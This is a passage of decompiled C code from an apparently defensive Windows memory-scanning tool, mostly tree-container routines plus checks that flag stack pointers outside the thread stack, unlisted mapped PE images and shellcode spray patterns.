        ppiVar4 = (int **)ppiVar4[1][1];
      }
      else {
        if (ppiVar4 == (int **)ppiVar1[2]) {
          FUN_004088fa(this,(int *)ppiVar1);
          ppiVar4 = ppiVar1;
        }
        *(undefined *)(ppiVar4[1] + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        FUN_0040893e(this,(int *)ppiVar4[1][1]);
      }
    }
    else {
      if (*(char *)(piVar3 + 3) == '\0') goto LAB_0040d5d6;
      if (ppiVar4 == (int **)*ppiVar1) {
        FUN_0040893e(this,(int *)ppiVar1);
        ppiVar4 = ppiVar1;
      }
      *(undefined *)(ppiVar4[1] + 3) = 1;
      *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
      FUN_004088fa(this,(int *)ppiVar4[1][1]);
    }
    piVar3 = ppiVar4[1];
  } while( true );
}



void __thiscall
FUN_0040d653(void *this,undefined4 *param_1,undefined4 param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  undefined4 *puVar3;
  int **extraout_ECX;
  int **ppiVar4;
  int **ppiVar5;
  bool local_8;
  
  ppiVar1 = param_3;
                    // WARNING: Load size is inaccurate
  ppiVar4 = *this;
  local_8 = true;
  ppiVar5 = ppiVar4;
  if (*(char *)((int)ppiVar4[1] + 0xd) == '\0') {
    ppiVar2 = (int **)ppiVar4[1];
    do {
      ppiVar5 = ppiVar2;
      local_8 = *param_3 < ppiVar5[4];
      if (local_8) {
        ppiVar2 = (int **)*ppiVar5;
      }
      else {
        ppiVar2 = (int **)ppiVar5[2];
      }
    } while (*(char *)((int)ppiVar2 + 0xd) == '\0');
  }
  param_3 = ppiVar5;
  if (local_8) {
    if (ppiVar5 == (int **)*ppiVar4) {
      local_8 = true;
      goto LAB_0040d6a7;
    }
    FUN_00409256((int **)&param_3);
    ppiVar4 = extraout_ECX;
  }
  ppiVar2 = param_3;
  if (*ppiVar1 <= param_3[4]) {
    FID_conflict__free(param_4);
    *param_1 = ppiVar2;
    *(undefined *)(param_1 + 1) = 0;
    return;
  }
LAB_0040d6a7:
  puVar3 = (undefined4 *)FUN_0040d52c(this,(int **)&param_4,local_8,ppiVar5,ppiVar4,param_4);
  *param_1 = *puVar3;
  *(undefined *)(param_1 + 1) = 1;
  return;
}



void __thiscall
FUN_0040d6f4(void *this,int **param_1,char param_2,int **param_3,undefined4 param_4,int **param_5)

{
  int **ppiVar1;
  code *pcVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  int **ppiVar4;
  
  if (0x71c71c5 < *(uint *)((int)this + 4)) {
    FID_conflict__free(param_5);
    FUN_00422ea9(extraout_ECX,extraout_DX);
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  *(uint *)((int)this + 4) = *(uint *)((int)this + 4) + 1;
  param_5[1] = (int *)param_3;
                    // WARNING: Load size is inaccurate
  if (param_3 == *this) {
    (*this)[1] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    **this = param_5;
                    // WARNING: Load size is inaccurate
    *(int ***)(*this + 8) = param_5;
  }
  else if (param_2 == '\0') {
    param_3[2] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == *(int ***)(*this + 8)) {
      *(int ***)(*this + 8) = param_5;
    }
  }
  else {
    *param_3 = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == (int **)**this) {
      **this = (int)param_5;
    }
  }
  piVar3 = param_5[1];
  ppiVar4 = param_5;
  do {
    if (*(char *)(piVar3 + 3) != '\0') {
                    // WARNING: Load size is inaccurate
      *(undefined *)(*(int *)(*this + 4) + 0xc) = 1;
      *param_1 = (int *)param_5;
      return;
    }
    ppiVar1 = (int **)ppiVar4[1];
    piVar3 = (int *)*ppiVar1[1];
    if (ppiVar1 == (int **)piVar3) {
      piVar3 = (int *)ppiVar1[1][2];
      if (*(char *)(piVar3 + 3) == '\0') {
LAB_0040d79e:
        *(undefined *)(ppiVar1 + 3) = 1;
        *(undefined *)(piVar3 + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        ppiVar4 = (int **)ppiVar4[1][1];
      }
      else {
        if (ppiVar4 == (int **)ppiVar1[2]) {
          FUN_004088fa(this,(int *)ppiVar1);
          ppiVar4 = ppiVar1;
        }
        *(undefined *)(ppiVar4[1] + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        FUN_0040893e(this,(int *)ppiVar4[1][1]);
      }
    }
    else {
      if (*(char *)(piVar3 + 3) == '\0') goto LAB_0040d79e;
      if (ppiVar4 == (int **)*ppiVar1) {
        FUN_0040893e(this,(int *)ppiVar1);
        ppiVar4 = ppiVar1;
      }
      *(undefined *)(ppiVar4[1] + 3) = 1;
      *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
      FUN_004088fa(this,(int *)ppiVar4[1][1]);
    }
    piVar3 = ppiVar4[1];
  } while( true );
}



void __thiscall
FUN_0040d81b(void *this,undefined4 *param_1,undefined4 param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  undefined4 *puVar3;
  int **extraout_ECX;
  int **ppiVar4;
  int **ppiVar5;
  bool local_8;
  
  ppiVar1 = param_3;
                    // WARNING: Load size is inaccurate
  ppiVar4 = *this;
  local_8 = true;
  ppiVar5 = ppiVar4;
  if (*(char *)((int)ppiVar4[1] + 0xd) == '\0') {
    ppiVar2 = (int **)ppiVar4[1];
    do {
      ppiVar5 = ppiVar2;
      local_8 = *param_3 < ppiVar5[4];
      if (local_8) {
        ppiVar2 = (int **)*ppiVar5;
      }
      else {
        ppiVar2 = (int **)ppiVar5[2];
      }
    } while (*(char *)((int)ppiVar2 + 0xd) == '\0');
  }
  param_3 = ppiVar5;
  if (local_8) {
    if (ppiVar5 == (int **)*ppiVar4) {
      local_8 = true;
      goto LAB_0040d86f;
    }
    FUN_00409256((int **)&param_3);
    ppiVar4 = extraout_ECX;
  }
  ppiVar2 = param_3;
  if (*ppiVar1 <= param_3[4]) {
    FID_conflict__free(param_4);
    *param_1 = ppiVar2;
    *(undefined *)(param_1 + 1) = 0;
    return;
  }
LAB_0040d86f:
  puVar3 = (undefined4 *)FUN_0040d6f4(this,(int **)&param_4,local_8,ppiVar5,ppiVar4,param_4);
  *param_1 = *puVar3;
  *(undefined *)(param_1 + 1) = 1;
  return;
}



void __thiscall
FUN_0040d8bc(void *this,int **param_1,char param_2,int **param_3,undefined4 param_4,int **param_5)

{
  int **ppiVar1;
  code *pcVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  int **ppiVar4;
  
  if (0x588fe7 < *(uint *)((int)this + 4)) {
    FID_conflict__free(param_5);
    FUN_00422ea9(extraout_ECX,extraout_DX);
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  *(uint *)((int)this + 4) = *(uint *)((int)this + 4) + 1;
  param_5[1] = (int *)param_3;
                    // WARNING: Load size is inaccurate
  if (param_3 == *this) {
    (*this)[1] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    **this = param_5;
                    // WARNING: Load size is inaccurate
    *(int ***)(*this + 8) = param_5;
  }
  else if (param_2 == '\0') {
    param_3[2] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == *(int ***)(*this + 8)) {
      *(int ***)(*this + 8) = param_5;
    }
  }
  else {
    *param_3 = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == (int **)**this) {
      **this = (int)param_5;
    }
  }
  piVar3 = param_5[1];
  ppiVar4 = param_5;
  do {
    if (*(char *)(piVar3 + 3) != '\0') {
                    // WARNING: Load size is inaccurate
      *(undefined *)(*(int *)(*this + 4) + 0xc) = 1;
      *param_1 = (int *)param_5;
      return;
    }
    ppiVar1 = (int **)ppiVar4[1];
    piVar3 = (int *)*ppiVar1[1];
    if (ppiVar1 == (int **)piVar3) {
      piVar3 = (int *)ppiVar1[1][2];
      if (*(char *)(piVar3 + 3) == '\0') {
LAB_0040d966:
        *(undefined *)(ppiVar1 + 3) = 1;
        *(undefined *)(piVar3 + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        ppiVar4 = (int **)ppiVar4[1][1];
      }
      else {
        if (ppiVar4 == (int **)ppiVar1[2]) {
          FUN_004088fa(this,(int *)ppiVar1);
          ppiVar4 = ppiVar1;
        }
        *(undefined *)(ppiVar4[1] + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        FUN_0040893e(this,(int *)ppiVar4[1][1]);
      }
    }
    else {
      if (*(char *)(piVar3 + 3) == '\0') goto LAB_0040d966;
      if (ppiVar4 == (int **)*ppiVar1) {
        FUN_0040893e(this,(int *)ppiVar1);
        ppiVar4 = ppiVar1;
      }
      *(undefined *)(ppiVar4[1] + 3) = 1;
      *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
      FUN_004088fa(this,(int *)ppiVar4[1][1]);
    }
    piVar3 = ppiVar4[1];
  } while( true );
}



void __thiscall
FUN_0040d9e3(void *this,undefined4 *param_1,undefined4 param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  undefined4 *puVar3;
  int **extraout_ECX;
  int **ppiVar4;
  int **ppiVar5;
  bool local_8;
  
  ppiVar1 = param_3;
                    // WARNING: Load size is inaccurate
  ppiVar4 = *this;
  local_8 = true;
  ppiVar5 = ppiVar4;
  if (*(char *)((int)ppiVar4[1] + 0xd) == '\0') {
    ppiVar2 = (int **)ppiVar4[1];
    do {
      ppiVar5 = ppiVar2;
      local_8 = *param_3 < ppiVar5[4];
      if (local_8) {
        ppiVar2 = (int **)*ppiVar5;
      }
      else {
        ppiVar2 = (int **)ppiVar5[2];
      }
    } while (*(char *)((int)ppiVar2 + 0xd) == '\0');
  }
  param_3 = ppiVar5;
  if (local_8) {
    if (ppiVar5 == (int **)*ppiVar4) {
      local_8 = true;
      goto LAB_0040da37;
    }
    FUN_00409256((int **)&param_3);
    ppiVar4 = extraout_ECX;
  }
  ppiVar2 = param_3;
  if (*ppiVar1 <= param_3[4]) {
    FID_conflict__free(param_4);
    *param_1 = ppiVar2;
    *(undefined *)(param_1 + 1) = 0;
    return;
  }
LAB_0040da37:
  puVar3 = (undefined4 *)FUN_0040d8bc(this,(int **)&param_4,local_8,ppiVar5,ppiVar4,param_4);
  *param_1 = *puVar3;
  *(undefined *)(param_1 + 1) = 1;
  return;
}



void __thiscall
FUN_0040da84(void *this,int **param_1,char param_2,int **param_3,undefined4 param_4,int **param_5)

{
  int **ppiVar1;
  code *pcVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  int **ppiVar4;
  
  if (0xaaaaaa8 < *(uint *)((int)this + 4)) {
    FID_conflict__free(param_5);
    FUN_00422ea9(extraout_ECX,extraout_DX);
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  *(uint *)((int)this + 4) = *(uint *)((int)this + 4) + 1;
  param_5[1] = (int *)param_3;
                    // WARNING: Load size is inaccurate
  if (param_3 == *this) {
    (*this)[1] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    **this = param_5;
                    // WARNING: Load size is inaccurate
    *(int ***)(*this + 8) = param_5;
  }
  else if (param_2 == '\0') {
    param_3[2] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == *(int ***)(*this + 8)) {
      *(int ***)(*this + 8) = param_5;
    }
  }
  else {
    *param_3 = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == (int **)**this) {
      **this = (int)param_5;
    }
  }
  piVar3 = param_5[1];
  ppiVar4 = param_5;
  do {
    if (*(char *)(piVar3 + 3) != '\0') {
                    // WARNING: Load size is inaccurate
      *(undefined *)(*(int *)(*this + 4) + 0xc) = 1;
      *param_1 = (int *)param_5;
      return;
    }
    ppiVar1 = (int **)ppiVar4[1];
    piVar3 = (int *)*ppiVar1[1];
    if (ppiVar1 == (int **)piVar3) {
      piVar3 = (int *)ppiVar1[1][2];
      if (*(char *)(piVar3 + 3) == '\0') {
LAB_0040db2e:
        *(undefined *)(ppiVar1 + 3) = 1;
        *(undefined *)(piVar3 + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        ppiVar4 = (int **)ppiVar4[1][1];
      }
      else {
        if (ppiVar4 == (int **)ppiVar1[2]) {
          FUN_004088fa(this,(int *)ppiVar1);
          ppiVar4 = ppiVar1;
        }
        *(undefined *)(ppiVar4[1] + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        FUN_0040893e(this,(int *)ppiVar4[1][1]);
      }
    }
    else {
      if (*(char *)(piVar3 + 3) == '\0') goto LAB_0040db2e;
      if (ppiVar4 == (int **)*ppiVar1) {
        FUN_0040893e(this,(int *)ppiVar1);
        ppiVar4 = ppiVar1;
      }
      *(undefined *)(ppiVar4[1] + 3) = 1;
      *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
      FUN_004088fa(this,(int *)ppiVar4[1][1]);
    }
    piVar3 = ppiVar4[1];
  } while( true );
}



void __thiscall
FUN_0040dbab(void *this,undefined4 *param_1,undefined4 param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  undefined4 *puVar3;
  int **extraout_ECX;
  int **ppiVar4;
  int **ppiVar5;
  bool local_8;
  
  ppiVar1 = param_3;
                    // WARNING: Load size is inaccurate
  ppiVar4 = *this;
  local_8 = true;
  ppiVar5 = ppiVar4;
  if (*(char *)((int)ppiVar4[1] + 0xd) == '\0') {
    ppiVar2 = (int **)ppiVar4[1];
    do {
      ppiVar5 = ppiVar2;
      local_8 = *param_3 < ppiVar5[4];
      if (local_8) {
        ppiVar2 = (int **)*ppiVar5;
      }
      else {
        ppiVar2 = (int **)ppiVar5[2];
      }
    } while (*(char *)((int)ppiVar2 + 0xd) == '\0');
  }
  param_3 = ppiVar5;
  if (local_8) {
    if (ppiVar5 == (int **)*ppiVar4) {
      local_8 = true;
      goto LAB_0040dbff;
    }
    FUN_00409256((int **)&param_3);
    ppiVar4 = extraout_ECX;
  }
  ppiVar2 = param_3;
  if (*ppiVar1 <= param_3[4]) {
    FID_conflict__free(param_4);
    *param_1 = ppiVar2;
    *(undefined *)(param_1 + 1) = 0;
    return;
  }
LAB_0040dbff:
  puVar3 = (undefined4 *)FUN_0040da84(this,(int **)&param_4,local_8,ppiVar5,ppiVar4,param_4);
  *param_1 = *puVar3;
  *(undefined *)(param_1 + 1) = 1;
  return;
}



int ** __thiscall FUN_0040dc4c(void *this,int **param_1)

{
  int *piVar1;
  int **ppiVar2;
  int iVar3;
  int **this_00;
  undefined4 *puVar4;
  int iVar5;
  int *piVar6;
  
  this_00 = param_1;
  FUN_0040ce22((int *)param_1);
  piVar1 = *param_1;
  param_1 = (int **)((uint)param_1 & 0xffffff00);
  puVar4 = FUN_0040e7e7(this_00,*(undefined4 **)(*(int *)((int)this + 0xc) + 4),piVar1,param_1);
  piVar1[1] = (int)puVar4;
  ppiVar2 = (int **)*this_00;
  this_00[1] = *(int **)((int)this + 0x10);
  piVar1 = ppiVar2[1];
  if (*(char *)((int)ppiVar2[1] + 0xd) == '\0') {
    do {
      piVar6 = piVar1;
      piVar1 = (int *)*piVar6;
    } while (*(char *)((int)piVar1 + 0xd) == '\0');
    *ppiVar2 = piVar6;
    iVar3 = (*this_00)[1];
    do {
      iVar5 = iVar3;
      iVar3 = *(int *)(iVar5 + 8);
    } while (*(char *)(iVar3 + 0xd) == '\0');
    (*this_00)[2] = iVar5;
  }
  else {
    *ppiVar2 = (int *)ppiVar2;
    (*this_00)[2] = (int)*this_00;
  }
  return this_00;
}



int ** __thiscall FUN_0040dcbe(void *this,int **param_1)

{
  int *piVar1;
  int **ppiVar2;
  int iVar3;
  int **this_00;
  undefined4 *puVar4;
  int iVar5;
  int *piVar6;
  
  this_00 = param_1;
  FUN_0040ce60((int *)param_1);
  piVar1 = *param_1;
  param_1 = (int **)((uint)param_1 & 0xffffff00);
  puVar4 = FUN_0040e867(this_00,*(undefined4 **)(*(int *)((int)this + 0x14) + 4),piVar1,param_1);
  piVar1[1] = (int)puVar4;
  ppiVar2 = (int **)*this_00;
  this_00[1] = *(int **)((int)this + 0x18);
  piVar1 = ppiVar2[1];
  if (*(char *)((int)ppiVar2[1] + 0xd) == '\0') {
    do {
      piVar6 = piVar1;
      piVar1 = (int *)*piVar6;
    } while (*(char *)((int)piVar1 + 0xd) == '\0');
    *ppiVar2 = piVar6;
    iVar3 = (*this_00)[1];
    do {
      iVar5 = iVar3;
      iVar3 = *(int *)(iVar5 + 8);
    } while (*(char *)(iVar3 + 0xd) == '\0');
    (*this_00)[2] = iVar5;
  }
  else {
    *ppiVar2 = (int *)ppiVar2;
    (*this_00)[2] = (int)*this_00;
  }
  return this_00;
}



int ** __thiscall FUN_0040dd30(void *this,int **param_1)

{
  int *piVar1;
  int **ppiVar2;
  int iVar3;
  int **this_00;
  undefined4 *puVar4;
  int iVar5;
  int *piVar6;
  
  this_00 = param_1;
  FUN_0040ce9e((int *)param_1);
  piVar1 = *param_1;
  param_1 = (int **)((uint)param_1 & 0xffffff00);
  puVar4 = FUN_0040e8e7(this_00,*(undefined4 **)(*(int *)((int)this + 0x1c) + 4),piVar1,param_1);
  piVar1[1] = (int)puVar4;
  ppiVar2 = (int **)*this_00;
  this_00[1] = *(int **)((int)this + 0x20);
  piVar1 = ppiVar2[1];
  if (*(char *)((int)ppiVar2[1] + 0xd) == '\0') {
    do {
      piVar6 = piVar1;
      piVar1 = (int *)*piVar6;
    } while (*(char *)((int)piVar1 + 0xd) == '\0');
    *ppiVar2 = piVar6;
    iVar3 = (*this_00)[1];
    do {
      iVar5 = iVar3;
      iVar3 = *(int *)(iVar5 + 8);
    } while (*(char *)(iVar3 + 0xd) == '\0');
    (*this_00)[2] = iVar5;
  }
  else {
    *ppiVar2 = (int *)ppiVar2;
    (*this_00)[2] = (int)*this_00;
  }
  return this_00;
}



undefined4 __fastcall FUN_0040ddb3(int param_1)

{
  uint *puVar1;
  undefined4 *puVar2;
  code *pcVar3;
  bool bVar4;
  uint uVar5;
  int *piVar6;
  int iVar7;
  int extraout_EDX;
  undefined4 uVar8;
  int *local_28 [2];
  void *local_20;
  uint local_1c;
  int local_18;
  undefined4 *local_14;
  int *local_10;
  int *local_c;
  uint *local_8;
  
  local_18 = param_1;
  FUN_0040dd30(*(void **)(param_1 + 4),local_28);
  uVar8 = 0;
  local_10 = (int *)*local_28[0];
  if (local_10 != local_28[0]) {
    do {
      puVar2 = (undefined4 *)local_10[4];
      local_14 = puVar2;
      local_c = (int *)FUN_0040c445(*(void **)(param_1 + 4),(uint)puVar2);
      local_20 = *(void **)(param_1 + 4);
      uVar5 = FUN_0040c4b8(local_20,puVar2);
      if ((local_c != (int *)0x0) && (uVar5 != 0)) {
        local_8 = (uint *)0x0;
        local_1c = 0;
        bVar4 = FUN_0040c380(local_20,local_c,&local_8,&local_1c);
        if ((bVar4 != false) &&
           ((uVar5 < *(uint *)((int)local_14 + (int)local_8 + (8 - (int)local_c)) ||
            (puVar1 = (uint *)((int)local_14 + (int)local_8 + (4 - (int)local_c)),
            *puVar1 <= uVar5 && uVar5 != *puVar1)))) {
          piVar6 = (int *)FUN_0040139e();
          if (piVar6 == (int *)0x0) {
            ATL::AtlThrowImpl(-0x7fffbffb);
            pcVar3 = (code *)swi(3);
            uVar8 = (*pcVar3)();
            return uVar8;
          }
          iVar7 = (**(code **)(*piVar6 + 0xc))();
          local_8 = (uint *)(iVar7 + 0x10);
          FUN_00408136((CSimpleStringT_char_0_ *)&local_8,
                       "The stack pointer for a thread points outside the TiB stack segment.\nTiB Address: %x\nActual stack pointer: %x\nTiB stack base: %x\nTiB stack limit: %x\n"
                      );
          FUN_0040c51e(*(int *)(local_18 + 4),extraout_EDX,&local_8);
          FUN_00401df0((int **)(local_8 + -4));
          uVar8 = 7;
          break;
        }
      }
      FUN_00402ad4(&local_10);
      param_1 = local_18;
    } while (local_10 != local_28[0]);
  }
  FUN_0040cb35(local_28);
  return uVar8;
}



undefined4 __fastcall FUN_0040deb9(int param_1)

{
  code *pcVar1;
  bool bVar2;
  char cVar3;
  undefined4 *puVar4;
  int **ppiVar5;
  uint uVar6;
  int *piVar7;
  int iVar8;
  int iVar9;
  int extraout_EDX;
  int extraout_EDX_00;
  uint *puVar10;
  uint *puVar11;
  undefined4 uVar12;
  LPVOID *ppvVar13;
  int **ppiVar14;
  uint *local_68;
  uint *local_64;
  int **local_60;
  uint *local_5c;
  DWORD local_58;
  int *local_54;
  int *local_50;
  int local_4c;
  int local_48;
  int local_44;
  int local_40;
  int *local_3c [2];
  int **local_34 [2];
  _SYSTEM_INFO local_2c;
  
  local_2c.u = 0;
  ppvVar13 = (LPVOID *)&local_2c.dwPageSize;
  for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {
    *ppvVar13 = (LPVOID)0x0;
    ppvVar13 = ppvVar13 + 1;
  }
  local_4c = param_1;
  GetSystemInfo(&local_2c);
  local_58 = local_2c.dwPageSize;
  FUN_0040dc4c(*(void **)(param_1 + 4),(int **)local_34);
  FUN_0040dcbe(*(void **)(param_1 + 4),local_3c);
  local_60 = (int **)*local_34[0];
  ppiVar14 = local_34[0];
  do {
    if (local_60 == ppiVar14) {
      uVar12 = 0;
LAB_0040e04a:
      FUN_0040cb35(local_3c);
      FUN_0040cb35(local_34);
      return uVar12;
    }
    piVar7 = local_60[10];
    if ((((piVar7 == (int *)&DAT_00000010) || (piVar7 == (int *)0x20)) || (piVar7 == (int *)0x40))
       || (piVar7 == (int *)0x80)) {
      local_54 = local_60[4];
      puVar10 = (uint *)((int)local_54 - local_58);
      local_64 = (uint *)0x0;
      local_68 = puVar10;
      local_50 = local_54;
      puVar4 = (undefined4 *)FUN_0040cb5e(local_34,&local_48,(uint *)&local_68);
      puVar11 = (uint *)0x0;
      if ((int **)*puVar4 != ppiVar14) {
        puVar11 = puVar10;
        local_64 = puVar10;
      }
      ppiVar5 = (int **)FUN_0040cb5e(local_3c,&local_44,(uint *)&local_54);
      piVar7 = local_3c[0];
      if ((*ppiVar5 == local_3c[0]) &&
         ((puVar11 == (uint *)0x0 ||
          (ppiVar5 = (int **)FUN_0040cb5e(local_3c,&local_40,(uint *)&local_64), *ppiVar5 == piVar7)
          ))) {
        iVar9 = local_4c;
        local_64 = (uint *)0x0;
        local_68 = (uint *)0x0;
        bVar2 = FUN_0040c380(*(void **)(local_4c + 4),local_50,&local_64,(uint *)&local_68);
        if (bVar2 != false) {
          if (local_68 < (uint *)0x40) {
            cVar3 = '\0';
          }
          else {
            uVar6 = FUN_0040e0eb(local_64,(uint)local_68);
            cVar3 = (char)uVar6;
          }
          if (cVar3 == '\0') goto LAB_0040dff3;
LAB_0040e0d8:
          uVar12 = 8;
          goto LAB_0040e04a;
        }
LAB_0040dff3:
        ppiVar14 = local_34[0];
        if (puVar11 != (uint *)0x0) {
          local_68 = (uint *)0x0;
          bVar2 = FUN_0040c380(*(void **)(iVar9 + 4),(int *)puVar11,&local_5c,(uint *)&local_68);
          ppiVar14 = local_34[0];
          if (bVar2 != false) {
            if (local_68 < (uint *)0x40) {
              cVar3 = '\0';
            }
            else {
              uVar6 = FUN_0040e0eb(local_5c,(uint)local_68);
              cVar3 = (char)uVar6;
            }
            ppiVar14 = local_34[0];
            if (cVar3 != '\0') {
              piVar7 = (int *)FUN_0040139e();
              if (piVar7 == (int *)0x0) {
                ATL::AtlThrowImpl(-0x7fffbffb);
                pcVar1 = (code *)swi(3);
                uVar12 = (*pcVar1)();
                return uVar12;
              }
              iVar8 = (**(code **)(*piVar7 + 0xc))();
              local_64 = (uint *)(iVar8 + 0x10);
              FUN_00408136((CSimpleStringT_char_0_ *)&local_64,
                           "The process has a PE mapped which is not in the modules list.\nSegment: %x\n"
                          );
              FUN_0040c51e(*(int *)(iVar9 + 4),extraout_EDX,&local_64);
              puVar4 = (undefined4 *)FUN_0040139e();
              FUN_00407b45(&local_5c,(int)local_5c,(int)local_68,puVar4);
              FUN_0040c51e(*(int *)(iVar9 + 4),extraout_EDX_00,&local_5c);
              FUN_00401df0((int **)(local_5c + -4));
              FUN_00401df0((int **)(local_64 + -4));
              goto LAB_0040e0d8;
            }
          }
        }
      }
    }
    FUN_00402ad4((int **)&local_60);
  } while( true );
}



uint __thiscall FUN_0040e0eb(void *this,uint param_1)

{
  int iVar1;
  uint in_EAX;
  
                    // WARNING: Load size is inaccurate
  if ((*this == 'M') && (*(char *)((int)this + 1) == 'Z')) {
    iVar1 = *(int *)((int)this + 0x3c);
    in_EAX = iVar1 + 0xf8;
    if (((in_EAX <= param_1) &&
        (((*(char *)(iVar1 + (int)this) == 'P' && (*(char *)(iVar1 + 1 + (int)this) == 'E')) &&
         (*(char *)(iVar1 + 2 + (int)this) == '\0')))) && (*(char *)(iVar1 + 3 + (int)this) == '\0')
       ) {
      return CONCAT31(1,*(short *)(iVar1 + 4 + (int)this) == 0x14c);
    }
  }
  return in_EAX & 0xffffff00;
}



undefined4 __fastcall FUN_0040e137(uint *param_1,undefined4 param_2)

{
  code *pcVar1;
  int **ppiVar2;
  uint *puVar3;
  bool bVar4;
  undefined4 uVar5;
  void *pvVar6;
  uint uVar7;
  int *piVar8;
  undefined4 *puVar9;
  int iVar10;
  int **ppiVar11;
  int extraout_EDX;
  int extraout_EDX_00;
  undefined4 uVar12;
  LPVOID *ppvVar13;
  int **ppiVar14;
  undefined8 uVar15;
  int **local_64;
  int **local_60;
  int **local_5c;
  DWORD local_58;
  uint *local_54;
  int local_50;
  int iStack76;
  int *local_48 [2];
  int **local_40 [2];
  void *local_38;
  int local_34;
  undefined4 local_30;
  _SYSTEM_INFO local_2c;
  
  uVar12 = 0;
  local_38 = (void *)0x0;
  local_34 = 0;
  local_30 = 0;
  local_54 = param_1;
  uVar5 = FUN_00402ff7((int *)&local_38,param_2,0x23);
  if ((char)uVar5 != '\0') {
    pvVar6 = FID_conflict__memcpy(local_38,&DAT_0042dbf0,0x23);
    local_34 = (int)pvVar6 + 0x23;
  }
  local_2c.u = 0;
  ppvVar13 = (LPVOID *)&local_2c.dwPageSize;
  for (iVar10 = 8; iVar10 != 0; iVar10 = iVar10 + -1) {
    *ppvVar13 = (LPVOID)0x0;
    ppvVar13 = ppvVar13 + 1;
  }
  GetSystemInfo(&local_2c);
  local_58 = local_2c.dwPageSize;
  FUN_0040dc4c((void *)param_1[1],(int **)local_40);
  FUN_0040dcbe((void *)param_1[1],local_48);
  local_5c = (int **)*local_40[0];
  ppiVar14 = local_40[0];
  do {
    ppiVar2 = local_5c;
    if (local_5c == ppiVar14) {
LAB_0040e324:
      FUN_0040cb35(local_48);
      FUN_0040cb35(local_40);
      FUN_00402ccf(&local_38);
      return uVar12;
    }
    local_64 = (int **)local_5c[4];
    piVar8 = local_5c[10];
    local_60 = local_64;
    if ((((piVar8 == (int *)&DAT_00000010) || (piVar8 == (int *)0x20)) || (piVar8 == (int *)0x40))
       || (piVar8 == (int *)0x80)) {
      piVar8 = &local_50;
      pvVar6 = (void *)0x40e206;
      uVar15 = FUN_0040cb5e(local_48,piVar8,(uint *)&local_64);
      ppiVar11 = (int **)((ulonglong)uVar15 >> 0x20);
      if (*(int **)uVar15 == local_48[0]) {
        local_64 = ppiVar2;
        if (ppiVar2 != (int **)*ppiVar14) {
          FUN_00409256((int **)&local_64);
          ppiVar11 = local_64 + 4;
          if ((uint)((int)local_60 - (int)*ppiVar11) <= local_58 << 2) {
            piVar8 = &iStack76;
            pvVar6 = (void *)0x40e246;
            uVar15 = FUN_0040cb5e(local_48,piVar8,(uint *)ppiVar11);
            ppiVar11 = (int **)((ulonglong)uVar15 >> 0x20);
            if (*(int **)uVar15 != local_48[0]) goto LAB_0040e275;
          }
        }
        FUN_0040e7a3((void **)&stack0xffffff84,ppiVar11,&local_38);
        puVar3 = local_54;
        ppiVar2 = local_60;
        uVar7 = FUN_0040e353(local_54,(int *)local_60,pvVar6,piVar8);
        ppiVar14 = local_40[0];
        if ((char)uVar7 != '\0') {
          piVar8 = (int *)FUN_0040139e();
          if (piVar8 == (int *)0x0) {
            ATL::AtlThrowImpl(-0x7fffbffb);
            pcVar1 = (code *)swi(3);
            uVar5 = (*pcVar1)();
            return uVar5;
          }
          iVar10 = (**(code **)(*piVar8 + 0xc))();
          local_64 = (int **)(iVar10 + 0x10);
          FUN_00408136((CSimpleStringT_char_0_ *)&local_64,
                       "The process has an executable mapping which contains a overlapping instruction shellode spray pattern.\nSegment: %x\n"
                      );
          FUN_0040c51e(puVar3[1],extraout_EDX,&local_64);
          local_5c = (int **)0x0;
          bVar4 = FUN_0040c380((void *)puVar3[1],(int *)ppiVar2,&local_54,(uint *)&local_5c);
          if (bVar4 != false) {
            puVar9 = (undefined4 *)FUN_0040139e();
            FUN_00407b45(&local_5c,(int)local_54,(int)local_5c,puVar9);
            FUN_0040c51e(puVar3[1],extraout_EDX_00,&local_5c);
            FUN_00401df0(local_5c + -4);
          }
          FUN_00401df0(local_64 + -4);
          uVar12 = 10;
          goto LAB_0040e324;
        }
      }
    }
LAB_0040e275:
    FUN_00402ad4((int **)&local_5c);
  } while( true );
}



uint __thiscall FUN_0040e353(void *this,int *param_1,void *param_2,void *param_3)

{
  undefined uVar1;
  bool bVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  int extraout_ECX;
  uint extraout_EDX;
  uint uVar6;
  uint uVar7;
  int iVar8;
  int iStackY60;
  undefined4 in_stack_ffffffc8;
  int in_stack_ffffffcc;
  undefined4 in_stack_ffffffd0;
  undefined4 uVar9;
  int iVar10;
  undefined4 uVar11;
  uint *local_c;
  uint local_8;
  
  uVar6 = 0;
